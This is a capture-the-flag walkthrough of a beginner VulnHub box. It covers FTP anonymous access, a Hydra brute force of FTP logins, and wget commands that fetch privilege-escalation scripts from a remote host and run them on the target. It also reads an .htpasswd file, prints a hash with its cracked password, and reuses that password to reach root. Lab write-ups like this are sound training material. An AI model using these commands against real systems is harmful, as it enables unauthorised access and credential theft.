# **Description**

It's a box for beginners and can be pwned in the lunch break.
This works better with VirtualBox rather than Vmware.

Discovering the Target IP address

┌──(kali㉿kali)-[~/Downloads/vulnhub/FunboxLunchBreaker]
└─$ sudo netdiscover -r 192.168.0.100/24 

![Markdown Logo](Images/Screenshot_30.png)

## **Active Reconnaissance** 

Running Nmap scan to discover open ports

Three ports are open

PORT   STATE SERVICE
* 21/tcp open  ftp
* 22/tcp open  ssh
* 80/tcp open  http


└─$ `sudo nmap -sV -O -A -T4 192.168.0.179` 

![My Sample Image](Images/Screenshot_31.png)


## **FTP Anonymous login**

Since FTP port is open and it allows anonymous login
Login to the FTP server using anonymous as username 

![My Sample Image](Images/Screenshot_32.png)

Use get command to download both the .s3cr3t and supers3cr3t files to the local host current working directory.

![My Sample Image](Images/Screenshot_1.png)

The .s3cr3t file contains base64 encrypted message

Decrypting the message, we got the plaintext below;

_**If the radiance of a thousand suns / were to burst at once into the sky / that would be like / the splendor of the Mighty One and I am become Death, the shatterer of worlds**_ 

![My Sample Image](Images/Screenshot_2.png)

Decrypting the message in supers3cr3t file using this url below.

https://www.dcode.fr/brainfuck-language

We got the plaintext below;

**_Look deep into nature and then you will understand everything better._**

![My Sample Image](Images/Screenshot_3.png)

##  **Enumerate the web server**
No vital information was found login anonymously through ftp.
Investigate the web server if any vital info could be found.

![My Sample Image](Images/Screenshot_4.png)

Check the robots.txt file which tells search engine crawlers which URLs the crawler can access on your site.
It says dirb, gobuster tools should be disallowed, these are directory bruteforcing tools.

And allow WYSIWYG
**_"what you see is what you get"_**

![My Sample Image](Images/Screenshot_5.png)


Inspecting the element, possible username was found.

Possible username (jane) was found on the html comment tag

 webdesign by j.miller [jane@funbox8.ctf]

![My Sample Image](Images/Screenshot_6.png)

## **Bruteforce Attack**

Possible username jane, trying to get her password
Using Hydra command which is a password bruteforce tool with rockyou.txt wordlist
The password for jane was found.


Login to the ftp server using jane credentials.

![My Sample Image](Images/Screenshot_7.png)
															
There is a backups directory, cd to the backup directory.
There is a key.txt file in backups directory.
Using get command the file was downloaded to the local machine. 

![My Sample Image](Images/Screenshot_9.png)


The keys.txt file contains encrpted keys. No useful information on how to use the key for authentication.

![My Sample Image](Images/Screenshot_10.png)

There is home directory, cd to home.
Jane can read other directories in /home 
Directories of other users were found.

![My Sample Image](Images/Screenshot_11.png)

Create a file for the users.
Use Hydra command to bruteforce for their possible passwords.

![My Sample Image](Images/Screenshot_12.png)

$ `hydra -L users.txt -P ~/Downloads/rockyou.txt ftp://192.168.0.179 -t4`

![My Sample Image](Images/Screenshot_13.png)

Login to the ftp server using Jim credentials.
List all the directories under Jim  ls -al.
.ssh directory was checked and no useful information was found.

![My Sample Image](Images/Screenshot_14.png)

Login to the ftp server using Jules credentials.
cd to the .backups directory

![My Sample Image](Images/Screenshot_15.png)

There are wordlist files in the backups directory which might be useful to get the john password.
Use mget command to download all the wordlist files to the local machine.


![My Sample Image](Images/Screenshot_16.png)

Go to the current working directory on the local machine and list all the files there.
The wordlist files are hidden, use -al flag with ls command to list the hidden files.


![My Sample Image](Images/Screenshot_17.png)

We need to move the hidden files to the current working directory.
Use move command to move the wordlist files to the current working directory.

![My Sample Image](Images/Screenshot_18.png)

Reusing Jules' password to ssh into the machine
Check if Jules has sudo privilege.
Jules does not have sudo privilege.

![My Sample Image](Images/Screenshot_19.png)

Linpeas.sh and lse.sh were used to read security information and to search for possible paths to escalate privileges on the target machine. 

Linux smart enumeration is a shell script which will show relevant information about the security of the local Linux system, helping to escalate privileges.

https://github.com/diego-treitos/linux-smart-enumeration

wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh


Linux local Privilege Escalation Awesome Script (linPEAS) is a script that search for possible paths to escalate privileges on Linux/Unix hosts.


$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -O linpeas.sh


Copy  the lse.sh and linpeas.sh files to the target machine.
Start the python http-server. 


![My Sample Image](Images/Screenshot_20.png)

Use wget command to download the lse.sh and linpeas.sh files from the local machine to the target machine (funbox8)

wget http://192.168.0.165/lse.sh

wget http://192.168.0.179/linpeas.sh


Change the mode bits of the .sh files using chmod command.

chmod +x *.sh


![My Sample Image](Images/Screenshot_21.png)

From the local machine, you can see the two files being sent to the remote machine.

![My Sample Image](Images\Screenshot_22.png)

Run the lse.sh to see all the vital information about the security of the machine.
./lse.sh -l 1 -i |more

John has root privilege.

![My Sample Image](Images/Screenshot_23.png)

John password hash was found.

![My Sample Image](Images/Screenshot_24.png)

Copy the hash

Cat /srv/ftp/wordpress/wp-blog/.htpasswd

john:$apr1$2gymw37l$w604wlgyqqNeOgNac.1qT/

![My Sample Image](Images/Screenshot_25.png)

Create a file for the hash; john2hash

![My Sample Image](Images/Screenshot_26.png)

Use john the ripper command with the wordlists to find plaintext of the hash
Bad.passwd wordlist worked. zhnmju!!!

![My Sample Image](Images/Screenshot_27.png)

Since John's password is known, switch user to John.
There is a todo.list file in todo directory which list all the tasks John intend to perform.
One of the task says change ROOTPASSWD, because it is the same right now. This implies John is still using his account password for root password too.

![My Sample Image](Images/Screenshot_28.png)

Switch user to root and enter john's password as the password. We are at the root now.
There is a root.flag file, open the file to read its content using cat command.

![My Sample Image](Images/Screenshot_29.png)

